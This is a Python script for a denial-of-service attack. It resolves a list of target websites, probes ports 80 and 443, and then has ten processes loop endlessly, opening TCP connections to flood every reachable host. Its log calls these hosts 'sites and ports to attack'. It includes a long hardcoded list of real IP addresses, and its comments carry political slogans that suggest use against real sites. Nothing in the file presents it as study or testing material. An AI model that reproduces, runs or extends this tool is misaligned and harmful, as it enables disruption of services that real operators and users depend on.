import socket
import multiprocessing
import time
# from scapy.all import *

import logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s :: %(levelname)s :: %(message)s')

######################################################################

# sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

used_random_ports = [80, 443]

# Open file with hosts
with open('sites.txt') as f:
    all_sites = f.readlines()

sent = 0

clean_ip_addresses = ['178.248.234.146', '178.248.237.44', '31.31.196.28', '185.165.123.176', '94.228.116.67',
                      '178.248.232.222', '134.17.94.194', '178.248.235.122', '178.248.233.32', '178.248.234.119',
                      '185.178.208.5', '185.71.67.4', '178.248.234.76', '186.2.163.126', '185.157.97.168', '178.248.233.188',
                      '178.248.232.136', '212.164.138.124', '185.71.67.190', '178.248.233.231', '185.178.208.4',
                      '81.163.21.216', '178.248.233.245', '178.248.238.17', '178.248.233.143', '178.248.238.21',
                      '104.21.18.181', '178.248.238.19', '78.155.198.92', '104.21.30.45', '141.101.120.10', '217.151.130.37',
                      '178.248.235.144', '178.248.238.72', '54.72.104.145', '193.233.63.180', '185.117.144.192',
                      '185.169.155.169', '178.248.238.79', '178.248.232.145', '217.175.24.112', '185.178.208.143',
                      '104.22.40.236', '62.152.39.7', '87.250.250.242', '185.71.67.147', '82.202.190.58', '194.54.14.168',
                      '194.54.14.131', '195.242.83.13', '82.202.190.10', '109.207.1.97', '94.79.51.13', '95.173.136.70',
                      '95.173.136.72', '95.173.136.168', '81.176.235.2', '89.208.226.45', '195.161.52.80', '185.71.67.220',
                      '109.207.1.118', '87.226.213.149', '87.226.213.155', '82.202.189.119', '212.203.66.44',
                      '185.169.155.171', '185.183.174.89', '93.84.116.187', '178.248.234.136', '195.50.4.175', '93.85.84.202',
                      '104.21.75.178', '93.84.114.37', '195.50.4.219', '178.124.138.31', '172.67.194.187', '93.84.112.130',
                      '195.50.4.224', '195.50.7.64', '77.88.55.66', '195.50.4.186', '178.124.138.24', '195.50.4.236',
                      '178.124.138.89', '178.124.138.66', '178.124.138.35', '93.125.48.166', '178.172.163.104',
                      '178.124.138.119', '5.188.136.118', '172.67.183.26', '172.67.6.185', '178.124.128.51', '172.67.179.184',
                      '5.255.255.55', '185.71.67.237', '185.79.118.12', '185.26.122.69', '188.127.251.146', '185.178.208.65',
                      '79.171.117.75', '91.142.135.116', '91.239.98.43', '31.13.129.80', '13.107.246.57', '178.248.233.186',
                      '178.248.238.121', '95.173.150.228', '82.202.190.244', '178.248.238.160', '178.248.238.180',
                      '185.169.155.145', '185.183.175.198', '178.248.238.210', '151.248.121.105', '91.232.131.28',
                      '37.113.132.49', '185.178.208.38', '82.119.148.2', '212.109.207.106', '45.155.92.12', '178.34.153.2',
                      '178.248.238.114', '31.13.129.68', '13.107.213.57', '185.64.46.66', '92.53.71.189', '62.76.205.110',
                      '194.54.14.139', '194.54.14.140', '194.54.14.155', '194.54.14.158', '185.157.97.176', '185.157.97.218',
                      '194.54.14.234', '194.54.14.100', '186.2.163.99', '185.71.67.1', '178.248.235.119', '185.71.67.228',
                      '217.21.210.211', '82.151.111.186', '91.239.5.8', '213.182.169.24', '185.178.208.74', '92.53.98.191',
                      '185.178.208.96', '213.159.213.33', '178.248.238.24', '89.239.185.186', '178.210.71.24',
                      '185.178.208.136', '217.107.219.57', '95.172.129.51', '80.255.150.171', '46.48.118.18', '89.237.29.234',
                      '185.101.204.52', '82.202.172.110', '195.128.96.134', '95.161.154.197', '141.101.250.56',
                      '92.126.230.35', '127.0.0.1', '81.177.140.111', '85.119.149.95', '95.216.144.70',
                      '87.249.230.100',
                      '85.235.172.158', '185.178.208.151', '172.67.202.151', '104.21.26.99', '172.67.161.184',
                      '104.21.15.54',
                      '190.115.19.114', '104.21.30.245', '172.67.174.54', '104.26.3.46', '172.67.178.67',
                      '5.196.144.226',
                      '172.67.194.148', '172.67.138.166', '185.165.123.240', '193.233.15.217', '185.178.208.165',
                      '104.26.3.17', '172.67.218.79', '107.154.85.14', '107.154.80.204', '107.154.79.204',
                      '107.154.215.204',
                      '107.154.218.22', '172.67.73.234', '104.21.38.35', '104.21.12.137'
                      ]


def port_check(ip, site_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)  # Timeout in case of port not open
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)  # Timeout in case of port not open
        s.connect((ip, site_port))  # Port ,Here 22 is port
        # s.sendall("Fuck Putin!!")
        # s.recv(1024)
        # print("Open")
        return True
    except:
        # print("Closed")
        return False


def create_nested_port_ip_list(ip_list, ports_list):
    global checked_port_nested_list
    total_targets = 0
    ports_list = [str(x) for x in ports_list]
    complete_list = []
    outer_port_list = []
    for index, port in enumerate(ports_list):
        outer_port_list.append(port)
        temp_list = outer_port_list[index].split()

        inner_port_list = []
        logging.info(f"Checking port {port}...")
        for each_ip in ip_list:
            if port_check(each_ip, int(port)):
                inner_port_list.append(each_ip)

        temp_list.append(inner_port_list)
        complete_list.append(temp_list)

        total_targets += len(inner_port_list)

        logging.info(f"Found '{len(inner_port_list) - len(ports_list)}' opened hosts for port: {port} ")
        checked_port_nested_list = complete_list
    return total_targets


def dns_resolve(sites):
    ips = []
    not_resolved_ips = []
    logging.info("Resolving hostnames, please wait...\n")

    for site in sites:
        site = site.replace("http://", "")
        site = site.replace("https://", "")
        site = site.replace("www.", "")
        site = site.replace(",", "")
        site = site.replace('"', "")
        site = site.replace("'", "")
        site = site.replace("\n", "")
        site = site.replace("\t", "")
        site = site.strip()
        if site[-1] == "/":
            site = site[:-1]
        try:
            ips.append(socket.gethostbyname(site))
        except Exception as error:
            not_resolved_ips.append(site)
            # logging.warning(f"Failed to resolve due to {error}")
    logging.info(f"Resolved {len(ips)} hosts")
    logging.warning(f"Failed to resolve next hosts: {not_resolved_ips}")

    return ips


def remove_duplicates(ips):
    # remove duplicates
    clean_ip_list = []
    [clean_ip_list.append(x) for x in ips if x not in clean_ip_list]
    logging.info(f"Amount of unique IPs {len(clean_ip_list)}")
    return clean_ip_list


# # Resolving hostnames
ip_addresses = dns_resolve(all_sites)
#
# # Remove duplicate IPs
clean_ip_addresses = remove_duplicates(ip_addresses)
#
# # Create list of Opened ports and IPs
total_targets = create_nested_port_ip_list(clean_ip_addresses, used_random_ports)
logging.info(f"Total open sites and ports to attack: {total_targets}")

def send_packets():
    while True:
        global sent
        # packet_size = random.randint(10, 20)
        # size_in_bytes_ = random._urandom(packet_size)

        for index, each_port in enumerate(checked_port_nested_list):
            for each_ip in each_port[1]:
                # print(each_ip, each_port[0])
                # sock_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                # sock_udp.sendto(bytes, (each_ip, int(each_port[0])))
                try:
                    # message = "fuck, russia!"
                    sock_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock_tcp.settimeout(0.001)

                    sock_tcp.connect((each_ip, int(each_port[0])))
                    #sock_tcp.send(message)
                    sock_tcp.close()

                except Exception as error:
                    logging.debug(f"f{error}")
                logging.info(f"Sent {sent} SYN packets to {each_ip} thought port: {each_port[0]}")

                # syn_flood(each_ip, int(each_port[0]))

                sent = sent + 1
                time.sleep(0.001)

# send_packets(test_data)

# Create multithreading job list
process_list = []
processes_total = 10
for i in range(processes_total):
    print("process + ", i)
    p = multiprocessing.Process(target=send_packets)
    p.start()
    process_list.append(p)

for process in process_list:
    process.join()
